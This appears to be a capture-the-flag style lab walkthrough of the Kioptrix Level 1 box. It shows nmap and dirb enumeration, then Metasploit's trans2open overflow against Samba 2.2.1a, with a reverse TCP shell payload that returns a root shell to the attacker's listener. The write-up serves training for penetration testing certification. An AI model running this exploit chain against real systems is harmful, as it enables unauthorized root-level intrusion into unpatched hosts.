# OSCP Vulnhub Set 1 - Kioptrix: Level 1 (#1)

lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=24ea2b8c-c02a-47a1-9db6-b7f021c301d8

target ip: `10.101.85.11`

---

## Scanning and Enumeration

find the service that running on that target ip.

```
nmap -A -sC -sV 10.101.85.11
```

- -A : Aggressive Mode
- -sC : Version Detection
- -sC : Default Script

now, i found the ssh, http, smb and etc. that running on terget ip.
```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/01]
└─$ nmap -A -sC -sV 10.101.85.11
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 23:04 -0400
Nmap scan report for 10.101.85.11
Host is up (0.0040s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey: 
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|_    SSL2_RC4_128_EXPORT40_WITH_MD5
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_ssl-date: 2026-05-14T07:05:22+00:00; +3h59m57s from scanner time.
|_http-title: 400 Bad Request
32768/tcp open  status      1 (RPC #100024)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.17
OS details: MontaVista embedded Linux 2.4.17
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: 3h59m56s
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   ...
2   10.98 ms 10.101.85.11

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.11 seconds
```

### http explore

open the target ip in browser to find the way to enter the target machine.


```
http://10.101.85.11
```

nothing useful.

![Step1](./images/01.png)

i also open the page source but found nothing that useful now.

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<HTML>
 <HEAD>
  <TITLE>Test Page for the Apache Web Server on Red Hat Linux</TITLE>
 </HEAD>
<!-- Background white, links blue (unvisited), navy (visited), red (active) -->
 <BODY BGCOLOR="#FFFFFF">

  <H1 ALIGN="CENTER">Test Page</H1>
  This page is used to test the proper operation of the Apache Web server after
  it has been installed.  If you can read this page, it means that the Apache
  Web server installed at this site is working properly.

  <HR WIDTH="50%">

  <H2 ALIGN="CENTER">If you are the administrator of this website:</H2>
  <P>
  You may now add content to this directory, and replace this page.  Note that
  until you do so, people visiting your website will see this page, and not your
  content.
  </P>

  <P>If you have upgraded from Red Hat Linux 6.2 and earlier, then you are
  seeing this page because the default <A
  href="manual/mod/core.html#documentroot"><STRONG>DocumentRoot</STRONG></A>
  set in <TT>/etc/httpd/conf/httpd.conf</TT> has changed.  Any subdirectories
  which existed under <TT>/home/httpd</TT> should now be moved to
  <TT>/var/www</TT>.  Alternatively, the contents of <TT>/var/www</TT> can be
  moved to <TT>/home/httpd</TT>, and the configuration file can be updated
  accordingly.
  </P>

  <HR WIDTH="50%">
  <H2 ALIGN="CENTER">If you are a member of the general public:</H2>

  <P>
  The fact that you are seeing this page indicates that the website you just
  visited is either experiencing problems, or is undergoing routine maintenance.
  </P>

  <P>
  If you would like to let the administrators of this website know that you've
  seen this page instead of the page you expected, you should send them e-mail.
  In general, mail sent to the name "webmaster" and directed to the website's
  domain should reach the appropriate person.
  </P>

  <P>
  For example, if you experienced problems while visiting www.example.com,
  you should send e-mail to "webmaster@example.com".
  </P>

  <HR WIDTH="50%">

  <P>
  The Apache <A HREF="manual/index.html" >documentation</A> has been included
  with this distribution.
  </P>

  <P>
  For documentation and information on Red Hat Linux, please visit the
  <a href="http://www.redhat.com/">Red Hat, Inc.</a> website. The manual for
  Red Hat Linux is available <a href="http://www.redhat.com/manual">here</a>.
  </P>

  <P>
  You are free to use the image below on an Apache-powered Web
  server.  Thanks for using Apache!
  </P>

  <P ALIGN="CENTER">
  <A HREF="http://www.apache.org/"><IMG SRC="/icons/apache_pb.gif" ALT="[ Powered
by Apache ]"></A>
  </P>

  <P>
  You are free to use the image below on a Red Hat Linux-powered Web
  server. Thanks for using Red Hat Linux!
  </P>

  <P ALIGN="center">
  <A HREF="http://www.redhat.com/"><IMG SRC="poweredby.png" ALT="[ Powered
by Red Hat Linux ]"></A>
  </P>
 </BODY>
</HTML>
```

find other directories, perhaps i could found the hidden things that useful.

```
dirb http://10.101.85.11/
```

nothing useful.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/01]
└─$ dirb http://10.101.85.11/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Wed May 13 23:33:52 2026
URL_BASE: http://10.101.85.11/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.101.85.11/ ----
+ http://10.101.85.11/~operator (CODE:403|SIZE:273)                                                                
+ http://10.101.85.11/~root (CODE:403|SIZE:269)                                                                    
+ http://10.101.85.11/cgi-bin/ (CODE:403|SIZE:272)                                                                 
+ http://10.101.85.11/index.html (CODE:200|SIZE:2890)                                                              
==> DIRECTORY: http://10.101.85.11/manual/                                                                         
==> DIRECTORY: http://10.101.85.11/mrtg/                                                                           
==> DIRECTORY: http://10.101.85.11/usage/                                                                          
                                                                                                                   
---- Entering directory: http://10.101.85.11/manual/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                                                   
---- Entering directory: http://10.101.85.11/mrtg/ ----
+ http://10.101.85.11/mrtg/index.html (CODE:200|SIZE:17318)                                                        
                                                                                                                   
---- Entering directory: http://10.101.85.11/usage/ ----
+ http://10.101.85.11/usage/index.html (CODE:200|SIZE:6505)                                                        
                                                                                                                   
-----------------
END_TIME: Wed May 13 23:36:27 2026
DOWNLOADED: 13836 - FOUND: 6
```

i will leave the http exploring for a while and find the other way.

### smb explore

the smb are interesting way for explore, let's investigate it by use `metasploit` and search for the smb version scanner module. 

```
msfconsole
search smb_version
```

the only one module that i can use is `auxiliary/scanner/smb/smb_version`.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/01]
└─$ msfconsole
Metasploit tip: Use help <command> to learn more about any command
                                                  
                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v6.4.126-dev                               ]
+ -- --=[ 2,638 exploits - 1,328 auxiliary - 2,154 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 12 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > search smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version  .                normal  No     SMB Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
```

use it and look to the setup requirement for this module.

```
use 0
options 
```

now, i know it need to set the rhost to target ip for run this module.

```
msf > use 0
msf auxiliary(scanner/smb/smb_version) > options 

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/b
                                       asics/using-metasploit.html
   RPORT                     no        The target port (TCP)
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.
```

set the rhost to target ip and run it.

```
set RHOSTS 10.101.85.11
run
```

now, i know the version of smb is `unix (samba 2.2.1a)`.

```
msf auxiliary(scanner/smb/smb_version) > set RHOSTS 10.101.85.11
RHOSTS => 10.101.85.11
msf auxiliary(scanner/smb/smb_version) > run
[*] 10.101.85.11:139      -   Host could not be identified: Unix (Samba 2.2.1a)
[*] 10.101.85.11          - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

i google it to search for the exploit, then i found this documentation.

```
https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/
```

after reading this documentation, i know the `trans2open` module is effective against `samba 2.2.1a`.

## Exploitation

let's search `trans2open` in `metasploit`.

```
msf auxiliary(scanner/smb/smb_version) > search trans2open

Matching Modules
================

   #  Name                                                         Disclosure Date  Rank   Check  Description
   -  ----                                                         ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
   4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
   5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .


Interact with a module by name or index. For example info 5, use 5 or use exploit/solaris/samba/trans2open
After interacting with a module you can manually set a TARGET with set TARGET 'Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce'
```

the `unix (samba 2.2.1a)` is also `linux`, so i will use the module 1 then find setup requirement.

```
use 1
options
```

i need to set the rhosts to target ip.

```
msf auxiliary(scanner/smb/smb_version) > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/ba
                                      sics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.101.55.75     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce



View the full module info with the info, or info -d command.
```

set rhosts to target ip then run it.
```
set RHOSTS 10.101.85.11
run
```

exploit success, but payload failure.

```
msf exploit(linux/samba/trans2open) > set RHOSTS 10.101.85.11
RHOSTS => 10.101.85.11
msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 10.101.55.75:4444 
[*] 10.101.85.11:139 - Trying return address 0xbffffdfc...
[*] 10.101.85.11:139 - Trying return address 0xbffffcfc...
[*] 10.101.85.11:139 - Trying return address 0xbffffbfc...
[*] 10.101.85.11:139 - Trying return address 0xbffffafc...
[*] Sending stage (1062760 bytes) to 10.101.85.11
[*] 10.101.85.11 - Meterpreter session 1 closed.  Reason: Died
[*] 10.101.85.11:139 - Trying return address 0xbffff9fc...
[*] Sending stage (1062760 bytes) to 10.101.85.11
[*] 10.101.85.11 - Meterpreter session 2 closed.  Reason: Died
[*] 10.101.85.11:139 - Trying return address 0xbffff8fc...
[*] Sending stage (1062760 bytes) to 10.101.85.11
[*] 10.101.85.11 - Meterpreter session 3 closed.  Reason: Died
[*] 10.101.85.11:139 - Trying return address 0xbffff7fc...
[*] Sending stage (1062760 bytes) to 10.101.85.11
[*] 10.101.85.11 - Meterpreter session 4 closed.  Reason: Died
```

i need to look other payload.
```
show payloads
```

i think i need to use more stably payload because the service is very old.

```
msf exploit(linux/samba/trans2open) > show payloads

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   0   payload/generic/custom                            .                normal  No     Custom Payload
   1   payload/generic/debug_trap                        .                normal  No     Generic x86 Debug Trap
   2   payload/generic/shell_bind_aws_ssm                .                normal  No     Command Shell, Bind SSM (via AWS API)
   3   payload/generic/shell_bind_tcp                    .                normal  No     Generic Command Shell, Bind TCP Inline
   4   payload/generic/shell_reverse_tcp                 .                normal  No     Generic Command Shell, Reverse TCP Inline
   5   payload/generic/ssh/interact                      .                normal  No     Interact with Established SSH Connection
   6   payload/generic/tight_loop                        .                normal  No     Generic x86 Tight Loop
   7   payload/linux/x86/adduser                         .                normal  No     Linux Add User
   8   payload/linux/x86/chmod                           .                normal  No     Linux Chmod
   9   payload/linux/x86/exec                            .                normal  No     Linux Execute Command
   10  payload/linux/x86/meterpreter/bind_ipv6_tcp       .                normal  No     Linux Mettle x86, Bind IPv6 TCP Stager (Linux x86)
   11  payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid  .                normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   12  payload/linux/x86/meterpreter/bind_nonx_tcp       .                normal  No     Linux Mettle x86, Bind TCP Stager
   13  payload/linux/x86/meterpreter/bind_tcp            .                normal  No     Linux Mettle x86, Bind TCP Stager (Linux x86)
   14  payload/linux/x86/meterpreter/bind_tcp_uuid       .                normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support (Linux x86)
   15  payload/linux/x86/meterpreter/reverse_ipv6_tcp    .                normal  No     Linux Mettle x86, Reverse TCP Stager (IPv6)
   16  payload/linux/x86/meterpreter/reverse_nonx_tcp    .                normal  No     Linux Mettle x86, Reverse TCP Stager
   17  payload/linux/x86/meterpreter/reverse_tcp         .                normal  No     Linux Mettle x86, Reverse TCP Stager
   18  payload/linux/x86/meterpreter/reverse_tcp_uuid    .                normal  No     Linux Mettle x86, Reverse TCP Stager
   19  payload/linux/x86/metsvc_bind_tcp                 .                normal  No     Linux Meterpreter Service, Bind TCP
   20  payload/linux/x86/metsvc_reverse_tcp              .                normal  No     Linux Meterpreter Service, Reverse TCP Inline
   21  payload/linux/x86/read_file                       .                normal  No     Linux Read File
   22  payload/linux/x86/shell/bind_ipv6_tcp             .                normal  No     Linux Command Shell, Bind IPv6 TCP Stager (Linux x86)
   23  payload/linux/x86/shell/bind_ipv6_tcp_uuid        .                normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support (Linux x86)
   24  payload/linux/x86/shell/bind_nonx_tcp             .                normal  No     Linux Command Shell, Bind TCP Stager
   25  payload/linux/x86/shell/bind_tcp                  .                normal  No     Linux Command Shell, Bind TCP Stager (Linux x86)
   26  payload/linux/x86/shell/bind_tcp_uuid             .                normal  No     Linux Command Shell, Bind TCP Stager with UUID Support (Linux x86)
   27  payload/linux/x86/shell/reverse_ipv6_tcp          .                normal  No     Linux Command Shell, Reverse TCP Stager (IPv6)
   28  payload/linux/x86/shell/reverse_nonx_tcp          .                normal  No     Linux Command Shell, Reverse TCP Stager
   29  payload/linux/x86/shell/reverse_tcp               .                normal  No     Linux Command Shell, Reverse TCP Stager
   30  payload/linux/x86/shell/reverse_tcp_uuid          .                normal  No     Linux Command Shell, Reverse TCP Stager
   31  payload/linux/x86/shell_bind_ipv6_tcp             .                normal  No     Linux Command Shell, Bind TCP Inline (IPv6)
   32  payload/linux/x86/shell_bind_tcp                  .                normal  No     Linux Command Shell, Bind TCP Inline
   33  payload/linux/x86/shell_bind_tcp_random_port      .                normal  No     Linux Command Shell, Bind TCP Random Port Inline
   34  payload/linux/x86/shell_reverse_tcp               .                normal  No     Linux Command Shell, Reverse TCP Inline
   35  payload/linux/x86/shell_reverse_tcp_ipv6          .                normal  No     Linux Command Shell, Reverse TCP Inline (IPv6)
```

i use payload 34 then try agin.

```
set payload 34
run
```
success.

```
msf exploit(linux/samba/trans2open) > set payload 34
payload => linux/x86/shell_reverse_tcp
msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 10.101.55.75:4444 
[*] 10.101.85.11:139 - Trying return address 0xbffffdfc...
[*] 10.101.85.11:139 - Trying return address 0xbffffcfc...
[*] 10.101.85.11:139 - Trying return address 0xbffffbfc...
[*] 10.101.85.11:139 - Trying return address 0xbffffafc...
[*] 10.101.85.11:139 - Trying return address 0xbffff9fc...
[*] 10.101.85.11:139 - Trying return address 0xbffff8fc...
[*] 10.101.85.11:139 - Trying return address 0xbffff7fc...
[*] 10.101.85.11:139 - Trying return address 0xbffff6fc...
[*] 10.101.85.11:139 - Trying return address 0xbffff5fc...
[*] 10.101.85.11:139 - Trying return address 0xbffff4fc...
[*] 10.101.85.11:139 - Trying return address 0xbffff3fc...
[*] 10.101.85.11:139 - Trying return address 0xbffff2fc...
[*] 10.101.85.11:139 - Trying return address 0xbffff1fc...
[*] 10.101.85.11:139 - Trying return address 0xbffff0fc...
[*] 10.101.85.11:139 - Trying return address 0xbfffeffc...
[*] 10.101.85.11:139 - Trying return address 0xbfffeefc...
[*] 10.101.85.11:139 - Trying return address 0xbfffedfc...
[*] 10.101.85.11:139 - Trying return address 0xbfffecfc...
[*] 10.101.85.11:139 - Trying return address 0xbfffebfc...
[*] 10.101.85.11:139 - Trying return address 0xbfffeafc...
[*] 10.101.85.11:139 - Trying return address 0xbfffe9fc...
[*] 10.101.85.11:139 - Trying return address 0xbfffe8fc...
[*] 10.101.85.11:139 - Trying return address 0xbfffe7fc...
[*] 10.101.85.11:139 - Trying return address 0xbfffe6fc...
[*] 10.101.85.11:139 - Trying return address 0xbfffe5fc...
[*] Command shell session 14 opened (10.101.55.75:4444 -> 10.101.85.11:32794) at 2026-05-14 04:02:29 -0400

[*] Command shell session 13 opened (10.101.55.75:4444 -> 10.101.85.11:32793) at 2026-05-14 04:02:44 -0400
id
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
```